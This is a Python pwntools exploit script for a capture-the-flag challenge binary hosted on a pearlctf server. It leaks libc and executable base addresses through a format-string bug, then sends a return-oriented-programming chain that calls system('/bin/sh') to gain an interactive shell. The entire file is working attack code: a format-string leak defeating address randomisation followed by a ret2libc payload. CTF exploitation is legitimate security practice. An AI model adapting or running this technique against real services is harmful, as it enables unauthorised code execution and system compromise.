#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'mr---ropot.ctf.pearlctf.in', 30009

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def fuzz():
    io = initialize()
    context.log_level = 'warn'
    for i in range(1, 30+1):
        io.sendline(b'2')
        io.sendline(f'%{i}$p'.encode())
        io.recvuntil(b'Response:\n')
        leak = io.recvline().strip()
        log.warn(f'[{i}] = {leak}')

def exploit():
    global io
    io = initialize()

    io.sendline(b'2')
    io.sendline(b'%17$p')
    io.recvuntil(b'Response:\n')
    libc.address = int(io.recvline().strip(), 16) - 0x2a1ca

    io.sendline(b'2')
    io.sendline(b'%21$p')
    io.recvuntil(b'Response:\n')
    elf.address = int(io.recvline().strip(), 16) - 0x152a

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    payload = flat({
        0x38: [
            pop_rdi,
            next(libc.search(b'/bin/sh\x00')),
            ret,
            libc.sym['system']
        ]
    })
    io.sendline(b'2')
    io.sendline(payload)

    log.info("libc base: %#x", libc.address)
    log.info("elf base: %#x", elf.address)
    io.interactive()
    
if __name__ == '__main__':
    # fuzz()
    exploit()
